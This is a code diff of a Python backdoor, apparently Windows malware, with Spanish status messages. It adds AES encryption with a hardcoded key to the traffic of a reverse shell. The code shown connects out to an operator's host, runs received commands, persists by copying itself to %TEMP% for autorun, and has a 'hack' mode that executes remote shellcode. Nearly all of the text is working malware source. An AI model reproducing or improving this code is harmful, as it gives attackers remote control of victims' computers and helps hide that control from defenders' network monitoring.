@@ -12,8 +12,34 @@ import sys
 import base64
 import os
 import socket
- 
- 
+import re
+from Crypto.Cipher import AES
+from Crypto import Random
+
+#Crypt Class
+class AESCipher:
+
+    def __init__(self, key, blk_sz):
+        self.key = key
+        self.blk_sz = blk_sz
+
+    def encrypt( self, raw ):
+        if raw is None or len(raw) == 0:
+            return ''
+        raw = raw + '\0' * (self.blk_sz - len(raw) % self.blk_sz)
+        iv = Random.new().read( AES.block_size )
+        cipher = AES.new( self.key, AES.MODE_CBC, iv )
+        return base64.b64encode( iv + cipher.encrypt( raw ) )
+
+    def decrypt( self, enc ):
+        if enc is None or len(enc) == 0:
+            return ''
+        enc = base64.b64decode(enc)
+        iv = enc[:16]
+        cipher = AES.new(self.key, AES.MODE_CBC, iv )
+        return re.sub('\0*$','', cipher.decrypt( enc[16:]))
+
+#Method to keep process into windows run
 def autorun(tempdir, fileName, run):
     # Copy executable to %TEMP%:
     os.system('copy %s %s' % (fileName, tempdir))
@@ -51,11 +77,23 @@ def decode(data):
     else:
         req_str = base64.b64decode(data)
     return req_str
+
+# Decode Cipher+Base64 data
+def decodeCipher(aes, data):
+    if len(data) % 4 != 0:  # check if multiple of 4
+        while len(data) % 4 != 0:
+            data = data + "="
+        req_str = base64.b64decode(data)
+    else:
+        req_str = base64.b64decode(data)
+    msg = aes.decrypt( req_str ) 
+    return msg
  
  
-# Encode Base64 data
-def encode(data):
-    return base64.b64encode(data)
+# Encode Cipher+Base64 data
+def encodeCipher(aes, data):
+    encryp_msg = aes.encrypt(data)
+    return base64.b64encode(encryp_msg)
  
  
 # Get JSON Configuration from file code with Base64
@@ -109,37 +147,45 @@ def hack(code):
     
 
 def shell(ip, port):
+    #CipherAES Object
+    aes = AESCipher( 'enf1JTGj1qjWaJD3agH2yyYnviHM05YGVLP852UkO0wwHw0Fa0'[:16], 32) #50 Characs
+    #Code to set hack mode
     code = "0"
     #Base64 encoded reverse shell
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip, int(port)))
         msg = '[*] Connection Established!'
-        s.send(encode(msg))
+        s.send(encodeCipher(aes, msg))
         while 1:
-            cmd = decode(s.recv(4096)) #Set to 4096 the buffer command, to allow send shellcode
+            cmd = decodeCipher(aes, s.recv(4096)) #Set to 4096 the buffer command, to allow send shellcode
             if cmd == "quit":
                 response = "Se ha cerrado la conexion"
-                encoded = encode(response)
+                encoded = encodeCipher(aes, response)
                 s.send(encoded)
                 break
             elif cmd == "hack":
                 response = "Se ha habilitado la ejecucion de ShellCode remoto"            
-                encoded = encode(response)
+                encoded = encodeCipher(aes, response)
                 s.send(encoded)
                 code = "1"
             elif code == "1":
-                code == "0"
-                response = "Se ha ejecutado el ShellCode"        
-                encoded = encode(response)
-                s.send(encoded)
-                hack(cmd)
-                break
+                code = "0"
+                if cmd == 'error':
+                    response = "Saliendo del modo hack debido a un error - No se ha enviado un ShellCode correcto"
+                    encoded = encodeCipher(aes, response)
+                    s.send(encoded)
+                else:
+                    response = "Se ha ejecutado el ShellCode"        
+                    encoded = encodeCipher(aes, response)
+                    s.send(encoded)
+                    hack(cmd)
+                    break
             else:
                 response = command(cmd)
                 # Here is where must implement action stuff
                 # response is result to exceute action
-                encoded = encode(response)
+                encoded = encodeCipher(aes, response)
                 s.send(encoded)           
     finally:
         s.close()
